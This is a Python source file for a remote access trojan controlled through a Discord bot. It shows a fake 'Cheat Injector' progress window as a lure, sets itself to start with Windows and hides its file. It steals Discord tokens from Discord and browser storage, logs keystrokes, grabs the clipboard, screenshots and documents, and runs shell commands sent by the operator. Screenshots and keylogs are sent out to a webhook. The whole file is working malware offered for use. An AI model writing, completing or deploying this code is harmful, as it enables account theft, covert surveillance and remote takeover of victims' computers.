# By Anielka
import os
import re
import sys
import time as t
import json as j
import ctypes as ct
import shutil as sh
import socket as so
import random as ra
import psutil as ps
import base64 as ba 
import string as str
import pyautogui as pya
import pyperclip as pyp
import platform as pla
import requests as req
import threading as thr
import subprocess as sub
if sys.platform == "win32":
    import winreg as win
from datetime import datetime as dat
from tkinter import Tk, Label, ttk
from pynput import keyboard as key
import discord as dc
from discord.ext import commands, tasks

BOT_TOKEN = ""
CHANNEL_ID = 
WEBHOOK_URL = ""

import secrets
CLIENT_ID = secrets.token_hex(4)

print("✅ CLIENT_ID:", CLIENT_ID)


KEYLOG_FILE = f"{CLIENT_ID}_keylog.txt"

keylogger_active = False
from datetime import timezone
start_time = dat.now(timezone.utc)

p = print

class fakeinstaller:
    def __init__(self):
        self.root = Tk()
        self.root.title("Cheat Injector v3.7")
        self.root.geometry("400x120")
        self.root.resizable(False, False)
        Label(self.root, text="Injecting Cheat... Please wait.", font=("Arial", 14)).pack(pady=10)
        self.progress = ttk.Progressbar(self.root, orient="horizontal", length=300, mode="determinate")
        self.progress.pack(pady=10)

    def run(self):
        def loop():
            for i in range(101):
                self.progress["value"] = i
                self.root.update_idletasks()
                t.sleep(0.05)
            self.root.destroy()
        thr.Thread(target=loop).start()
        self.root.mainloop()

class Persistence:
    @staticmethod
    def add_to_startup():
        if sys.platform != "win32":
            return
        path = os.path.realpath(sys.argv[0])
        name = "WindowsSystemHost"
        key = win.OpenKey(
            win.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            win.KEY_SET_VALUE
        )
        win.SetValueEx(key, name, 0, win.REG_SZ, path)
        key.Close()


    @staticmethod
    def hide_file():
        if sys.platform == "win32":
            try:
                ct.windll.kernel32.SetFileAttributesW(sys.argv[0], 0x02)
            except:
                pass

class TokenStealer:
    def __init__(self):
        self.paths = {
            "Discord": os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb",
            "Discord Canary": os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
            "Chrome": os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            "Edge": os.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            "Brave": os.getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"
        }
        self.token_re = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
        self.mfa_re = re.compile(r"mfa\.[\w-]{84}")

    def validate(self, token):
        try:
            r = req.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if r.status_code == 200:
                return r.json()
        except:
            return None
        return None

    def steal(self):
        embeds = []
        for name, path in self.paths.items():
            if not os.path.exists(path): continue
            for file in os.listdir(path):
                if not file.endswith((".log", ".ldb")): continue
                try:
                    with open(os.path.join(path, file), "r", errors="ignore") as f:
                        content = f.read()
                        tokens = self.token_re.findall(content) + self.mfa_re.findall(content)
                        for token in set(tokens):
                            user = self.validate(token)
                            embed = dc.Embed(title=f"Token from {name}", color=0x00ff00 if user else 0xff0000)
                            embed.add_field(name="Token", value=token, inline=False)
                            embed.add_field(name="Type", value="MFA" if token.startswith("mfa.") else "Regular", inline=True)
                            embed.add_field(name="Status", value="Valid" if user else "Invalid", inline=True)
                            if user:
                                embed.add_field(name="User", value=f"{user['username']}#{user['discriminator']} ({user['id']})", inline=False)
                            embed.set_footer(text=f"{dat.utcnow()} UTC")
                            embeds.append(embed)
                except: continue
        return embeds

class keylogger:
    def __init__(self, log_file=KEYLOG_FILE):
        self.log_file = log_file
        self.listener = None
        self.recording = False

    def _on_press(self, key):
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(f"{key} ")
        except:
            pass

    def start(self):
        if self.recording:
            return
        self.listener = key.Listener(on_press=self._on_press)
        self.listener.start()
        self.recording = True

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.recording = False

    def get_logs(self):
        if os.path.exists(self.log_file):
            with open(self.log_file, "r", encoding="utf-8") as f:
                return f.read()
        return "No logs recorded."

    def clear_logs(self):
        if os.path.exists(self.log_file):
            os.remove(self.log_file)

class ClipboardStealer:
    @staticmethod
    def get_clipboard():
        try:
            return pyp.paste()
        except:
            return "Clipboard read failed."

class ScreenshotTool:
    @staticmethod
    def take_screenshot(path=None):
        try:
            if not path:
                path = f"{CLIENT_ID}_screenshot.png"
            pya.screenshot(path)
            return path
        except:
            return None

class SystemInfoCollector:
    @staticmethod
    def get_info():
        try:
            info = {
                "Hostname": so.gethostname(),
                "Username": os.getenv("USERNAME") or os.getenv("USER"),
                "Platform": pla.platform(),
                "Processor": pla.processor(),
                "RAM (GB)": round(ps.virtual_memory().total / (1024 ** 3), 2),
                "IP": req.get("https://api.ipify.org").text,
                "Client ID": CLIENT_ID
            }
            return info
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def as_text():
        data = SystemInfoCollector.get_info()
        return "\n".join([f"{k}: {v}" for k, v in data.items()])

class RATClient(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.keylogger = keylogger()
        self.tokenstealer = TokenStealer()

    @commands.Cog.listener()
    async def on_ready(self):
        chan = self.bot.get_channel(CHANNEL_ID)
        if chan:
            await chan.send(f"✅ `{CLIENT_ID}` is online on `{pla.node()}`")

    @commands.command()
    async def exec(self, ctx, *, cmd: str):
        try:
            result = sub.check_output(cmd, shell=True, stderr=sub.STDOUT)
            await ctx.send(f"```{result.decode()[:1900]}```")
        except Exception as e:
            await ctx.send(f"❌ Error: {str(e)}")

    @commands.command()
    async def ss(self, ctx):
        path = ScreenshotTool.take_screenshot()
        if path and os.path.exists(path):
            await ctx.send(file=dc.File(path))
            os.remove(path)
        else:
            await ctx.send("❌ Failed to take screenshot.")

    @commands.command()
    async def clipboard(self, ctx):
        content = ClipboardStealer.get_clipboard()
        await ctx.send(f"📋 Clipboard:\n```{content[:1900]}```")

    @commands.command()
    async def tokens(self, ctx):
        embeds = self.tokenstealer.steal()
        if embeds:
            for e in embeds:
                await ctx.send(embed=e)
        else:
            await ctx.send("🚫 No tokens found.")

    @commands.command()
    async def system(self, ctx):
        await ctx.send(f"```\n{SystemInfoCollector.as_text()}\n```")

    @commands.command()
    async def keylog(self, ctx, action: str = None):
        if action == "start":
            self.keylogger.start()
            await ctx.send("🎹 Keylogger started.")
        elif action == "stop":
            self.keylogger.stop()
            await ctx.send("🛑 Keylogger stopped.")
        else:
            await ctx.send("❔ Usage: !keylog start | stop")

    @commands.command()
    async def logs(self, ctx):
        data = self.keylogger.get_logs()
        if data.strip():
            with open(KEYLOG_FILE, "w", encoding="utf-8") as f:
                f.write(data)
            await ctx.send(file=dc.File(KEYLOG_FILE))
        else:
            await ctx.send("📭 No keylog data yet.")

    @commands.command()
    async def msgbox(self, ctx, *, text: str):
        ct.windll.user32.MessageBoxW(0, text, "RAT Message", 0x40)
        await ctx.send("📨 Message box sent.")

    @commands.command()
    async def uptime(self, ctx):
        delta = dat.utcnow() - start_time
        await ctx.send(f"⏱ Uptime: {delta}")

    @commands.command()
    async def download(self, ctx, *, url: str):
        try:
            filename = url.split("/")[-1].split("?")[0]
            r = req.get(url)
            with open(filename, "wb") as f:
                f.write(r.content)
            await ctx.send(f"📥 Downloaded `{filename}`")
        except Exception as e:
            await ctx.send(f"❌ Download failed: {e}")

    @commands.command()
    async def help(self, ctx):
        cmds = {
            "!exec <cmd>": "Execute shell command",
            "!ss": "Take a screenshot",
            "!clipboard": "Grab clipboard contents",
            "!tokens": "Steal Discord tokens",
            "!system": "Show system info",
            "!keylog start|stop": "Start/Stop keylogger",
            "!logs": "Send keylogger logs",
            "!msgbox <text>": "Send a Windows message box",
            "!uptime": "Show RAT uptime",
            "!download <url>": "Download a file from a URL",
            "!processes": "List running processes",
            "!listdir <path>": "List files in directory",
            "!stealfiles": "Steal documents from user's PC",
            "!antivm": "Detect virtual machines",
            "!selfdestruct": "Delete and exit RAT"
        }
        msg = "**💀 Available Commands:**\n" + "\n".join([f"`{k}` - {v}" for k, v in cmds.items()])
        await ctx.send(msg)


import asyncio

def run_bot():
    bot = commands.Bot(command_prefix="!", intents=dc.Intents.all(), help_command=None)

    async def setup():
        await bot.add_cog(RATClient(bot))
        await bot.start(BOT_TOKEN)

    asyncio.run(setup())


def auto_screenshot():
    while True:
        try:
            path = ScreenshotTool.take_screenshot()
            if path and os.path.exists(path):
                req.post(WEBHOOK_URL, files={"file": open(path, "rb")})
                os.remove(path)
        except: pass
        t.sleep(1800)

def auto_keylog():
    while True:
        try:
            if os.path.exists(KEYLOG_FILE):
                with open(KEYLOG_FILE, "r", encoding="utf-8") as f:
                    data = f.read()
                if data.strip():
                    req.post(WEBHOOK_URL, files={"file": open(KEYLOG_FILE, "rb")})
                    open(KEYLOG_FILE, "w").close()
        except: pass
        t.sleep(900)


class FileStealer:
    @staticmethod
    def steal_docs(target_dir="Documents", exts=(".txt", ".pdf", ".docx")):
        base = os.path.join(os.environ["USERPROFILE"], target_dir)
        files = []
        if not os.path.exists(base): return []
        for root, dirs, filenames in os.walk(base):
            for f in filenames:
                if f.lower().endswith(exts):
                    full_path = os.path.join(root, f)
                    files.append(full_path)
        return files[:10]

class ProcessScanner:
    @staticmethod
    def list_processes():
        return [p.name() for p in ps.process_iter()] 

class DirectoryExplorer:
    @staticmethod
    def list_dir(path):
        try:
            return os.listdir(path)
        except:
            return []

class AntiVM:
    @staticmethod
    def detect():
        suspicious = ["VBox", "VMware", "VirtualBox", "vboxservice"]
        proc_names = [p.name().lower() for p in ps.process_iter()]
        return any(vm.lower() in p for p in proc_names for vm in suspicious)

@commands.command()
async def processes(ctx):
    procs = ProcessScanner.list_processes()
    await ctx.send(f"🧠 {len(procs)} processes running.\n```{chr(10).join(procs[:30])}```")

@commands.command()
async def listdir(ctx, *, path: str):
    files = DirectoryExplorer.list_dir(path)
    await ctx.send(f"📂 Listing `{path}`\n```{chr(10).join(files[:40])}```")

@commands.command()
async def stealfiles(ctx):
    files = FileStealer.steal_docs()
    if files:
        for f in files:
            try:
                await ctx.send(file=dc.File(f))
            except: pass
    else:
        await ctx.send("❌ No document files found.")

@commands.command()
async def antivm(ctx):
    result = AntiVM.detect()
    await ctx.send("⚠️ VM detected!" if result else "✅ Looks clean.")

@commands.command()
async def selfdestruct(ctx):
    await ctx.send("💣 Self-destruct initiated.")
    try:
        os.remove(sys.argv[0])
    except: pass
    os._exit(1)

RATClient.processes = processes
RATClient.listdir = listdir
RATClient.stealfiles = stealfiles
RATClient.antivm = antivm
RATClient.selfdestruct = selfdestruct

def main():
    Persistence.add_to_startup()
    Persistence.hide_file()
    fakeinstaller().run()
    run_bot()
    thr.Thread(target=auto_screenshot).start()
    thr.Thread(target=auto_keylog).start()

if __name__ == "__main__":
    main()